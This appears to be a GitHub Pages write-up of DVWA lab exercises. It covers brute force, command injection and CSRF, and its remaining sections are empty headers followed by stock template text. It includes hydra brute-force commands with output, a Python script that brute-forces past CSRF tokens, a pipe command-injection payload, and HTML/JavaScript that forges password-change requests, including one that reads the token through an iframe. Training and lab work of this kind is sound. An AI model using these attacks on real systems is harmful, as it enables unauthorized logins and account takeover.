## DVWA Writeups



- [Brute Force](#brute-force)

- [Command Injection](#command-injection)

- [Cross Site Request Forgery (CSRF)](#cross-site-request-forgery-csrf)

- [File Inclusion](#file-inclusion)

- [File Upload](#file-upload)

- [SQL Injection](#sql-injection)

- [SQL Injection (Blind)](#sql-injection-blind)

- [Weak Session IDs](#weak-session-ids)

- [DOM Based Cross Site Scripting (XSS)](#dom-based-cross-site-scripting-xss)

- [Reflected Cross Site Scripting (XSS)](#reflected-cross-site-scripting-xss)

- [Stored Cross Site Scripting (XSS)](#stored-cross-site-scripting-xss)

- [Content Security Policy (CSP) Bypass](#content-security-policy-csp-bypass)

- [JavaScript Attacks](#javascript-attacks)


---


### Brute Force


The goal is to brute force an HTTP login page.

**Security level is currently: low.**

On submitting the username and password we see that it is using get request 

<img width="477" alt="image" src="https://user-images.githubusercontent.com/79740895/185153021-af373095-102b-4d68-88c7-573499351bc5.png">

So let’s use hydra for brute force:

``` 
hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: security=low; PHPSESSID=rt5o26sooph0v8p5nuarofj346"
```

Here we are using cookies because if we are not authenticated when we make the login attempts, we will be redirected to default login page.

<!-- {::options parse_block_html="true" /}  -->

<details><summary markdown="span">Click to see output :diamond_shape_with_a_dot_inside: </summary>
  
```Shell
┌─[aftab@parrot]─[~/Downloads/dvwa]
└──╼ $hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: security=low; PHPSESSID=rt5o26sooph0v8p5nuarofj346"
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-17 23:50:56
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-get-form://127.0.0.1:80/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: security=low; PHPSESSID=rt5o26sooph0v8p5nuarofj346
[80][http-get-form] host: 127.0.0.1   login: admin   password: password
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-08-17 23:51:59

```
  
</details>

<!-- {::options parse_block_html="false" /} -->

Login credentials found by hydra:
`admin:password`

<br/>

**Security level is currently: medium.**


It is still using get request.

so lets use hydra again:
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 'http-get-form://127.0.0.1/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:S=Welcome:H=Cookie\: PHPSESSID=j422143437vlsdgqs0t1385420; security=medium'
```
it still work but this time attack takes significantly longer then before.

on analyzing the login functionality we notice that the response is delayed by 2 or 3 seconds on wrong attempt.

<details><summary markdown="span">Click to see output :diamond_shape_with_a_dot_inside: </summary>
  
```Shell
┌─[aftab@parrot]─[~/Downloads/dvwa]
└──╼ $hydra -l admin -P /usr/share/wordlists/rockyou.txt 'http-get-form://127.0.0.1/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:S=Welcome:H=Cookie\: PHPSESSID=j422143437vlsdgqs0t1385420; security=medium'
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-18 09:17:45
[INFORMATION] escape sequence \: detected in module option, no parameter verification is performed.
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-get-form://127.0.0.1:80/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:S=Welcome:H=Cookie\: PHPSESSID=j422143437vlsdgqs0t1385420; security=medium
[80][http-get-form] host: 127.0.0.1   login: admin   password: password
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-08-18 09:18:50

```
  
</details>

<br/>

**Security level is currently: high.**

It's still get request but this time one additional parameter `user_token`

It's using CSRF token so hydra wont help, let's use python this time.

<details><summary markdown="span">Click to see python code :diamond_shape_with_a_dot_inside: </summary>
  
```python
import requests
from bs4 import BeautifulSoup
from requests.structures import CaseInsensitiveDict

url = 'http://127.0.0.1/vulnerabilities/brute/'

headers = CaseInsensitiveDict()
headers["Cookie"] = "security=high; PHPSESSID=j422143437vlsdgqs0t1385420"

r = requests.get(url, headers=headers)

r1 = r.content
soup = BeautifulSoup(r1, 'html.parser')
user_token = soup.findAll('input', attrs={'name': 'user_token'})[0]['value']
  
with open("/usr/share/wordlists/rockyou.txt", 'rb') as f:
    for i in f.readlines():
        i = i[:-1]
        try:
            a1 = i.decode()
        except UnicodeDecodeError:
            print(f'can`t decode {i}')
            continue

        r = requests.get(
            f'http://127.0.0.1/vulnerabilities/brute/?username=admin&password={a1}&Login=Login&user_token={user_token}#',
            headers=headers)
        r1 = r.content
        soup1 = BeautifulSoup(r1, 'html.parser')
        user_token = soup1.findAll('input', attrs={'name': 'user_token'})[0]['value']
        print(f'checking {a1}')
        if 'Welcome' in r.text:
            print(f'LoggedIn: username: admin , password:{a1}   ===found===')
            break
```
  
</details>

<details><summary markdown="span">Click to see output :diamond_shape_with_a_dot_inside: </summary>
  
```Shell
┌─[aftab@parrot]─[~/Downloads/dvwa]
└──╼ $python brute_high.py 
checking 123456
checking 12345
checking 123456789
checking password
LoggedIn: username: admin , password:password   ===found===
```
  
</details>

<br/>

---

### Command Injection

<img width="467" alt="image" src="https://user-images.githubusercontent.com/79740895/185295923-7a149c9d-8f1e-4262-ae0a-3884514462ac.png">

we are given with functionality to ping device. we give ip or domain to ping:

input: localhost

output:

<img width="463" alt="image" src="https://user-images.githubusercontent.com/79740895/185296846-d2795040-d782-4d85-af22-5197875b0f91.png">

This is about command injection so backend must be appending our input ping command.

we can give our arbitrary command to execute with the help of pipe `|` ,so let's create a simple payload :
```
|ls
```

<img width="467" alt="image" src="https://user-images.githubusercontent.com/79740895/185297755-e48d1fc7-cccd-4a81-acf3-3558ffb70366.png">

_it works on all low, medium and high_

<br/>

---

### Cross Site Request Forgery (CSRF)

**Security level is currently: low.**

<img width="827" alt="image" src="https://user-images.githubusercontent.com/79740895/185393318-096ce7f2-f881-4aee-ba63-1a6c2074fb52.png">

Here we can change password, there is no csrf protection. We can create simple form to auto submit and change password of victim.

<details><summary markdown="span">Click to see html code for CSRF :diamond_shape_with_a_dot_inside: </summary>
  
```html
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://192.168.170.131/vulnerabilities/csrf/">
      <input type="hidden" name="password&#95;new" value="pass" />
      <input type="hidden" name="password&#95;conf" value="pass" />
      <input type="hidden" name="Change" value="Change" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```
  
</details>

we can host this page so when victim visit page their password will automatically change.

I'm using python to host webpage:

<details><summary markdown="span">Click to see output :diamond_shape_with_a_dot_inside: </summary>
  
```Shell
C:\Users\AFTAB SAMA\Downloads>python -m http.server 80
Serving HTTP on :: port 80 (http://[::]:80/) ...
::ffff:192.168.173.222 - - [18/Aug/2022 18:03:11] "GET /csrf-test.html HTTP/1.1" 200 -
::ffff:192.168.173.222 - - [18/Aug/2022 18:03:12] code 404, message File not found
::ffff:192.168.173.222 - - [18/Aug/2022 18:03:12] "GET /favicon.ico HTTP/1.1" 404 -
```

</details>



**Security level is currently: medium.**

Same attack won't work, looking at sourcecode we know that server checks where the request came from.

<img width="333" alt="image" src="https://user-images.githubusercontent.com/79740895/185403021-db671fc3-c08d-47e2-8a8f-fdb639e50e90.png">

one way to get around is if we can upload our file in server.

Now first of all change csrf.html into csrf.php file, then set low security level and switch into file uploading vulnerability inside DVWA.

Here the above text file of html form is now saved as csrf.php is successfully uploaded in the server which you can see from given screenshot.

<img width="468" alt="image" src="https://user-images.githubusercontent.com/79740895/185402657-d1e47dc3-2884-4619-a5a6-5dafbe459a68.png">

now we can use this new url: `http://192.168.170.131/hackable/uploads/csrf.php`

password changed.



**Security level is currently: high.**

This time it use csrf token. we can read this token if we have same origin and we can do that by uploading our payload to server as shown previously.

upload this code to server:

<details><summary markdown="span">Click to see code :diamond_shape_with_a_dot_inside: </summary>
  
```html
<html>
 <body>
  <p>TOTALLY LEGITIMATE AND SAFE WEBSITE </p>
  <iframe id="myFrame" src="http://192.168.170.131/vulnerabilities/csrf" style="visibility: hidden;" onload="maliciousPayload()"></iframe>
  <script>
   function maliciousPayload() {
    console.log("start");
    var iframe = document.getElementById("myFrame");
    var doc = iframe.contentDocument  || iframe.contentWindow.document;
    var token = doc.getElementsByName("user_token")[0].value;
const http = new XMLHttpRequest();
    const url = "http://192.168.170.131/vulnerabilities/csrf/?password_new=hackerman&password_conf=hackerman&Change=Change&user_token="+token+"#";
    http.open("GET", url);
    http.send();
    console.log("password changed");
   }
  </script>
 </body>
</html>
```

</details>

on visiting this url it will read token from DOM and create password change request to server.

<img width="478" alt="image" src="https://user-images.githubusercontent.com/79740895/185408922-c1d9e774-3e43-4170-bcda-3c0269fc6260.png">

<br/>

---

### File Inclusion



---

### File Upload

---

### SQL Injection

---

### SQL Injection (Blind)

---

### Weak Session IDs

---

### DOM Based Cross Site Scripting (XSS)

---

### Reflected Cross Site Scripting (XSS)

---

### Stored Cross Site Scripting (XSS)

---

### Content Security Policy (CSP) Bypass

---

### JavaScript Attacks


---

Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for

```markdown
Syntax highlighted code block

# Header 1
## Header 2
### Header 3

- Bulleted
- List

1. Numbered
2. List

**Bold** and _Italic_ and `Code` text

[Link](url) and ![Image](src)
```

For more details see [Basic writing and formatting syntax](https://docs.github.com/en/github/writing-on-github/getting-started-with-writing-and-formatting-on-github/basic-writing-and-formatting-syntax).

### Jekyll Themes

Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/Aftab700/DVWA-Writeup/settings/pages). The name of this theme is saved in the Jekyll `_config.yml` configuration file.

### Support or Contact

Having trouble with Pages? Check out our [documentation](https://docs.github.com/categories/github-pages-basics/) or [contact support](https://support.github.com/contact) and we’ll help you sort it out.
